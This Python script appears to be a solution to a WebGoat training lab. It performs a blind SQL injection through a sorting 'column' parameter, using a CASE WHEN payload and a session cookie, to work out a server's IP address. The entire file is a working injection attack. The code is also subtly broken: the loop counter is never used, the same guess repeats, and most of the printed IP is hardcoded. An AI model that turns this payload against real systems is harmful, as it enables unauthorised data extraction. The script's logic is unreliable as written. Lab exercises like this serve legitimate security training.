import json
import requests
import argparse

def sql_injection(jsessionid):
    index = 0

    headers = {
        'Cookie': f'JSESSIONID={jsessionid}'
    }
    
    for i in range(1, 256):
        
        payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(index)

        r = requests.get('http://webgoat:8080/WebGoat/SqlInjectionMitigations/servers?column=' + payload, headers=headers)

        try:
            response = json.loads(r.text)
        except:
            print("Invalid JSESSIONID")
            return

        if response[0]['id'] == '1':
            print('webgoat-prd IP: {}.130.219.202'.format(index))
            return

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SQL Injection Script')
    parser.add_argument('jsessionid', type=str, help='JSESSIONID for the session')
    args = parser.parse_args()
    
    sql_injection(args.jsessionid)